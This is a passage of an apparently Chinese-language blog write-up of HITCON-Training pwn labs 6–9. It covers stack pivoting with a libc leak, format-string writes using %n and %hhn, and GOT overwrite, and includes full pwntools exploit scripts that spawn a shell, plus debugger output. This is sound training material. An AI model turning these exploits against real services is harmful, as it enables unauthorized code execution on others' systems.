class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\">0x08048000 0x08049000 0x00000000 r-x /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x08049000 0x0804a000 0x00000000 r-- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rw- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0xf7dfe000 0xf7dff000 0x00000000 rw- </span><br><span class=\"line\">0xf7dff000 0xf7faf000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7faf000 0xf7fb1000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb1000 0xf7fb2000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb2000 0xf7fb5000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd3000 0xf7fd4000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class=\"line\">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class=\"line\">0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xfffdd000 0xffffe000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"1-将fake-frame写到RW段\"><a href=\"#1-将fake-frame写到RW段\" class=\"headerlink\" title=\"1.将fake_frame写到RW段\"></a>1.将fake_frame写到RW段</h4><p>执行两次leave ret跳转到rwadddr</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-leak-libc\"><a href=\"#2-leak-libc\" class=\"headerlink\" title=\"2.leak libc\"></a>2.leak libc</h4><p>执行两次leave ret跳转到rwaddr+0x100</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># adjust stack to next part chain of rop</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># call read</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"3-RCE\"><a href=\"#3-RCE\" class=\"headerlink\" title=\"3.RCE\"></a>3.RCE</h4><p>rwaddr+0x100处直接getshell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x28</span></span><br><span class=\"line\">popebp = <span class=\"number\">0x0804856b</span></span><br><span class=\"line\">ret = <span class=\"number\">0x08048356</span></span><br><span class=\"line\">leaveret = <span class=\"number\">0x08048418</span></span><br><span class=\"line\">rwaddr = <span class=\"number\">0x0804b000</span><span class=\"number\">-0x300</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0804836d : pop ebx ; ret</span></span><br><span class=\"line\">pop1 = <span class=\"number\">0x0804836d</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\" :\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\"># arg3</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">rop = p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># retn addr of puts_plt</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>])</span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># after pop 1</span></span><br><span class=\"line\">rop += p32(leaveret)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvline()[:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab7——Crack\"><a href=\"#Lab7——Crack\" class=\"headerlink\" title=\"Lab7——Crack\"></a>Lab7——Crack</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开了canary，栈利用应该比较困难。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab7$ checksec crack</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是典型的格式化字符串利用，将bss段的全局变量passwprd覆盖为已知值即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd; <span class=\"comment\">// ST14_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [esp+8h] [ebp-80h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+18h] [ebp-70h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+7Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v3 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">  srand(v3);</span><br><span class=\"line\">  fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  read(fd, &amp;password, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"What your name ? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x63</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello ,\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(&amp;buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Your password :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">0xF</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( atoi(&amp;nptr) == password )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Congrt!!\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"cat /home/crack/flag\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Goodbyte\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>首先测得 or 调试得到格式化字符串在栈中的偏移为10，然后布置<code>target_addr%10$n</code>的格式化字符串，向target_addr写入4。然后输入4即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a048</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%10$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">\":\"</span>, <span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Congrt!!</span><br><span class=\"line\">cat: /home/crack/flag: No such file or directory</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab8——craxme\"><a href=\"#Lab8——craxme\" class=\"headerlink\" title=\"Lab8——craxme\"></a>Lab8——craxme</h2><h3 id=\"防护-6\"><a href=\"#防护-6\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab8$ checksec craxme</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>和Lab7相似，也是fmt的利用，分别向目标地址写入218和0xFACEB00C，前者直接写即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a038</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">218</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>后者需要有一定的构造。首先，由于是小端存储，要向内存中写4个byte的数据，只要用<code>$hhn</code>分别向单字节写即可。如要想写入0x12345678，相当于分别向target_addr ~ target_addr + 3的地址写入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x78</span><br><span class=\"line\">0x56</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x12</span><br></pre></td></tr></table></figure>\n<p>首先将地址放在栈中，然后计算应该padding多少个字节，最后用hhn写入。注意取余</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_addr = <span class=\"number\">0x804a038</span></span><br><span class=\"line\">target = <span class=\"number\">0xFACEB00C</span></span><br><span class=\"line\">payload = p32(target_addr) + p32(target_addr + <span class=\"number\">1</span>) + p32(target_addr + <span class=\"number\">2</span>) + p32(target_addr + <span class=\"number\">3</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0x0c</span> - len(payload)) % <span class=\"number\">256</span>) + <span class=\"string\">\"c%7$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xb0</span> - <span class=\"number\">0x0c</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%8$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xce</span> - <span class=\"number\">0xb0</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%9$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xfa</span> - <span class=\"number\">0xce</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%10$hhn\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab9——playfmt\"><a href=\"#Lab9——playfmt\" class=\"headerlink\" title=\"Lab9——playfmt\"></a>Lab9——playfmt</h2><h3 id=\"防护-7\"><a href=\"#防护-7\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab9$ checksec playfmt</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>也是格式化字符串的利用，每次向bss段上读入0xc8的格式化字符串，然后printf，当读入quit时，退出。</p>\n<p>显然，因为格式化字符串不在栈上，所以处理起来有些麻烦，首先可以看到相对偏移为15的位置有一个libc上的地址，将它leak出来获得libc基地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf0c│+0x0000: 0x08048540  →  &lt;do_fmt+69&gt; add esp, 0x10\t ← $esp</span><br><span class=\"line\">0xffffcf10│+0x0004: 0x0804a060  →  &quot;AAAA%p%p%p%p%p%p%p%p%p&quot;</span><br><span class=\"line\">0xffffcf14│+0x0008: 0x08048640  →  &quot;quit&quot;</span><br><span class=\"line\">0xffffcf18│+0x000c: 0x00000004</span><br><span class=\"line\">0xffffcf1c│+0x0010: 0x0804857c  →  &lt;play+51&gt; add esp, 0x10 </span><br><span class=\"line\">0xffffcf20│+0x0014: 0x08048645  →  &quot;=====================&quot;</span><br><span class=\"line\">0xffffcf24│+0x0018: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf28│+0x001c: 0xffffcf38  →  0xffffcf48  →  0x00000000\t ← $ebp &lt;= ebp1 7</span><br><span class=\"line\">0xffffcf2c│+0x0020: 0x08048584  →  &lt;play+59&gt; nop &lt;= 8</span><br><span class=\"line\">0xffffcf30│+0x0024: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf34│+0x0028: 0x00000000</span><br><span class=\"line\">0xffffcf38│+0x002c: 0xffffcf48  →  0x00000000 &lt;= ebp2 11</span><br><span class=\"line\">0xffffcf3c│+0x0030: 0x080485b1  →  &lt;main+42&gt; nop &lt;= 12</span><br><span class=\"line\">0xffffcf40│+0x0034: 0xf7fb13dc  →  0xf7fb21e0  →  0x00000000</span><br><span class=\"line\">0xffffcf44│+0x0038: 0xffffcf60  →  0x00000001</span><br><span class=\"line\">0xffffcf48│+0x003c: 0x00000000</span><br><span class=\"line\">0xffffcf4c│+0x0040: 0xf7e17637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br></pre></td></tr></table></figure>\n<p>但是，也因为fmt string不在栈上，想要任意地址写则比较困难，这里参考了Vidar-Team某师傅的题解（<a href=\"https://veritas501.space/2017/05/23/HITCON-training%20writeup/\" target=\"_blank\" rel=\"noopener\">https://veritas501.space/2017/05/23/HITCON-training%20writeup/</a>），利用栈中ebp的相对偏移已知的特点。我们可以看到0xffffcf28处ebp指向0xffffcf38处，而0xffffcf38处指向0xffffcf48处。</p>\n<p>这里有几个需要注意的点：</p>\n<ul>\n<li>首先我们需要leak栈地址，才能利用格式化字符串漏洞进行写入，通过”%6$x”将ebp1处存的ebp2的栈地址leak出来，然后根据相对偏移算出ebp1、nop1、nop2的地址。</li>\n<li>如果我们修改ebp1，就相当于向ebp2的地址写，再修改ebp2，也就相当于往任意地址写。</li>\n<li>注意到栈地址只有低2个字节不同，所以用hn写入低两个字节即可修改ebp1处和ebp2处的地址。</li>\n<li>我们想要劫持got表，将printf@got修改为system。由Lab8可以知道，想写入一个大整数，直接写4个byte是不行的，所以在这里我们分开写，两个byte两个byte的写：将nop1修改为printf@got的地址，将nop2修改为printf@got + 2的地址，然后用%c$hn写入即可。</li>\n</ul>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 